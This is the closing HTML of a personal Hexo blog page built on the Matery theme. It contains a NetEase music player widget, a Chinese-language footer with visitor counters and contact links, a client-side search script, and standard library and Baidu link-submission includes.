    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
        left: -66px !important;
    }

    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
        left: 0px !important;
    }

    
</style>
<div class="">
    
    <div class="row">
        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
                   server="netease"
                   type="playlist"
                   id="569213220"
                   fixed='true'
                   autoplay='false'
                   theme='#42b983'
                   loop='all'
                   order='random'
                   preload='auto'
                   volume='0.7'
                   list-folded='true'
        >
        </meting-js>
    </div>
</div>

<script src="/libs/aplayer/APlayer.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script>

    
    <div class="container row center-align" style="margin-bottom: 0px !important;">
        <div class="col s12 m8 l8 copy-right">
            Copyright&nbsp;&copy;
            
                <span id="year">2016# 年份-2021</span>
            
            <span id="year">2016# 年份</span>
            <a href="/about" target="_blank">yaron</a>
            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
            <br>
            
            
            
            
            
            
            <span id="busuanzi_container_site_pv">
                |&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
                    class="white-color"></span>&nbsp;次
            </span>
            
            
            <span id="busuanzi_container_site_uv">
                |&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;<span id="busuanzi_value_site_uv"
                    class="white-color"></span>&nbsp;人
            </span>
            
            <br>
            
            <br>
            
        </div>
        <div class="col s12 m4 l4 social-link social-statis">
    <a href="https://github.com/s-yaron" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
        <i class="fab fa-github"></i>
    </a>



    <a href="mailto:6acker@pm.me" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
        <i class="fas fa-envelope-open"></i>
    </a>













    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
        <i class="fas fa-rss"></i>
    </a>

</div>
    </div>
</footer>

<div class="progress-bar"></div>


    <!-- 搜索遮罩框 -->
<div id="searchModal" class="modal">
    <div class="modal-content">
        <div class="search-header">
            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
                   class="search-input">
        </div>
        <div id="searchResult"></div>
    </div>
</div>

<script type="text/javascript">
$(function () {
    var searchFunc = function (path, search_id, content_id) {
        'use strict';
        $.ajax({
            url: path,
            dataType: "xml",
            success: function (xmlResponse) {
                // get the contents from search data
                var datas = $("entry", xmlResponse).map(function () {
                    return {
                        title: $("title", this).text(),
                        content: $("content", this).text(),
                        url: $("url", this).text()
                    };
                }).get();
                var $input = document.getElementById(search_id);
                var $resultContent = document.getElementById(content_id);
                $input.addEventListener('input', function () {
                    var str = '<ul class=\"search-result-list\">';
                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
                    $resultContent.innerHTML = "";
                    if (this.value.trim().length <= 0) {
                        return;
                    }
                    // perform local searching
                    datas.forEach(function (data) {
                        var isMatch = true;
                        var data_title = data.title.trim().toLowerCase();
                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
                        var data_url = data.url;
                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
                        var index_title = -1;
                        var index_content = -1;
                        var first_occur = -1;
                        // only match artiles with not empty titles and contents
                        if (data_title !== '' && data_content !== '') {
                            keywords.forEach(function (keyword, i) {
                                index_title = data_title.indexOf(keyword);
                                index_content = data_content.indexOf(keyword);
                                if (index_title < 0 && index_content < 0) {
                                    isMatch = false;
                                } else {
                                    if (index_content < 0) {
                                        index_content = 0;
                                    }
                                    if (i === 0) {
                                        first_occur = index_content;
                                    }
                                }
                            });
                        }
                        // show search results
                        if (isMatch) {
                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
                            var content = data.content.trim().replace(/<[^>]+>/g, "");
                            if (first_occur >= 0) {
                                // cut out 100 characters
                                var start = first_occur - 20;
                                var end = first_occur + 80;
                                if (start < 0) {
                                    start = 0;
                                }
                                if (start === 0) {
                                    end = 100;
                                }
                                if (end > content.length) {
                                    end = content.length;
                                }
                                var match_content = content.substr(start, end);
                                // highlight all keywords
                                keywords.forEach(function (keyword) {
                                    var regS = new RegExp(keyword, "gi");
                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
                                });

                                str += "<p class=\"search-result\">" + match_content + "...</p>"
                            }
                            str += "</li>";
                        }
                    });
                    str += "</ul>";
                    $resultContent.innerHTML = str;
                });
            }
        });
    };

    searchFunc('/search.xml', 'searchInput', 'searchResult');
});
</script>

    <!-- 回到顶部按钮 -->
<div id="backTop" class="top-scroll">
    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
        <i class="fas fa-arrow-up"></i>
    </a>
</div>


    <script src="/libs/materialize/materialize.min.js"></script>
    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
    <script src="/libs/aos/aos.js"></script>
    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
    <script src="/js/matery.js"></script>

    <!-- Baidu Analytics -->

    <!-- Baidu Push -->

<script>
    (function () {
        var bp = document.createElement('script');
        var curProtocol = window.location.protocol.split(':')[0];
        if (curProtocol === 'https') {
            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
        } else {
            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
        }
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(bp, s);
    })();
</script>

    
    <script src="/libs/others/clicklove.js" async="async"></script>
    
    
    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
    

    

    

	
    

    

    

    
    <script src="/libs/instantpage/instantpage.js" type="module"></script>
    

</body>

</html>
